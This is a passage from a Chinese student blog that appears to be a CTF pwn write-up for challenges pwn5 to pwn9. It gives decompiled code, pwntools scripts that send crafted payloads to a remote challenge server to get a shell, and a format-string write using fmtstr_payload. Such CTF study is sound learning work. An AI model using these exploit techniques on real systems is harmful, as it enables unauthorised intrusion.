12345678910111213141516from pwn import *#sh = process(&#x27;./pwn5&#x27;)sh = remote(&quot;101.43.247.245&quot;,9204)systemaddr = 0x8048440binsh = 0x80486C0context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x008048987&quot;)#payload = p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+p32(0x14c94000)payload = &quot;1234123412341234&quot; + &quot;85140&quot;sh.sendline(payload)sh.interactive()







pwn6看看又改了啥…
123456789101112131415161718192021222324252627signed int sub_80488CE()&#123;  int v0; // eax  char v2; // [esp-Ch] [ebp-24h]  char *nptr; // [esp+Ch] [ebp-Ch]  sub_804887C();  nptr = (char *)sub_8059F40(48);  sub_8048980(nptr, 48);  v0 = atoi_0(nptr);  if ( v0 == 2 )  &#123;    sub_8048980(nptr, 48);  &#125;  else if ( v0 &gt; 2 )  &#123;    if ( v0 == 3 )      return 0;    if ( v0 == 12345 )      sub_804F6F0(&quot;/bin/sh&quot;);  &#125;  else if ( v0 == 1 )  &#123;    sub_804F9F0(&quot;where is shell&quot;, v2);  &#125;  return 1;&#125;



输入12345即可
root@hecs-149507:~&#x2F;haida# nc 101.43.247.245 9205
12345
pwn7123456789int sub_89588B7()&#123;  char s; // [esp+0h] [ebp-68h]  sub_895F980(&quot;please input the way you want go&quot;);  __libc_read(0, &amp;s, 96);  _IO_puts(&amp;s);  return sub_80488E7(&amp;s, 0);&#125;





一个char为什么能占据那么多栈空间???
应该是有很多路径,可以根据&#x2F;bin&#x2F;sh回溯吧?
是的…一点点回溯就可以找到
845542A -&gt; 816c3f7-&gt;8091787-&gt;805ac47 -&gt;804d177-&gt;8049ae7-&gt;8048cd7-&gt;8048977-&gt;80488e7-&gt;main
p32(87)+p32(83)+p32(68)+p32(87)+p32(65)+p32(65)+p32(87)+p32(68)+p32(87)
878368876565876887
WSDWAAWDW(这个就是答案)
为什么87变成0x38了 56了
0x80488fd  movzx eax, byte ptr [eax]
pwn8格式化字符串,修改内存值即可
修改0x80EBF9C处的值为28
1234567891011121314int sub_80488CE()&#123;  int result; // eax  char v1; // [esp+0h] [ebp-68h]  sub_804F9B0(&quot;please input what you want say&quot;);  __libc_read(0, &amp;v1, 96);  sub_804F9B0(&amp;v1);  if ( dword_80EBF9C == 28 )    result = sub_804F6B0(&quot;/bin/sh&quot;);  else    result = sub_804F9B0(&quot;the key is %d %d&quot;);  return result;&#125;









123456789101112131415from pwn import *payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)sh = remote(&quot;101.43.247.245&quot;,9207)context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x008048987&quot;)#payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)payload = fmtstr_payload(4,&#123;0x80EBF9C:28&#125;)sh.sendline(payload)sh.interactive()











pwn91234567891011int sub_8048945()&#123;  char v1; // [esp+0h] [ebp-1B8h]  char v2; // [esp+150h] [ebp-68h]  _IO_puts(&quot;please input your username&quot;);  __libc_read(0, &amp;v2, 32);  _IO_puts(&quot;please input your passwd&quot;);  __libc_read(0, &amp;v1, 335);  return sub_80488E7(&amp;v1);&#125;





不存在溢出
后面函数是往一个地址写数据..有什么用呢?
有后们函数,所以应该是要覆盖字符串,或者说字符串复制
0x08048948 覆盖为 0x80488CE(system)
第一次写入要覆盖的地址,第二次覆盖
问题回头有时间可以自己编译一下符号
​	这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究
哪个都行, 不过有一个问题就是,这个值会是固定的嘛…
plt的过程再熟悉下
</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/#content-inner">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/#content-inner">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/#content-inner">8</a><a class="extend next" rel="next" href="/page/4/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">80</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-unix系统接口"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><time datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试"><img src="/img/background/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-46-glibc源码调试"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试">pwn入门-46-glibc源码调试</a><time datetime="2023-11-06T13:01:36.000Z" title="发表于 2023-11-06 21:01:36">2023-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/" title="c语言回炉重造-结构-输入与输出"><img src="/img/background/9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-结构-输入与输出"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/" title="c语言回炉重造-结构-输入与输出">c语言回炉重造-结构-输入与输出</a><time datetime="2023-10-31T10:00:20.000Z" title="发表于 2023-10-31 18:00:20">2023-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/" title="pwn入门-45-10月月赛两题"><img src="/img/background/7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-45-10月月赛两题"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/" title="pwn入门-45-10月月赛两题">pwn入门-45-10月月赛两题</a><time datetime="2023-10-30T13:15:56.000Z" title="发表于 2023-10-30 21:15:56">2023-10-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">52</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(103, 94, 119)">旅游</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(32, 122, 121)">路由器</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(7, 72, 42)">浏览器安全</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(119, 200, 87)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(62, 89, 46)">C语言</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(36, 30, 141)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(145, 90, 128)">堆</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(155, 53, 177)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(152, 43, 181)">脚本</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(193, 177, 80)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(149, 42, 35)">诗歌</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(88, 134, 92)">调试</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(190, 61, 94)">论文</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(182, 137, 150)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(75, 163, 138)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">3</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">80</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-12-11T09:36:00.483Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>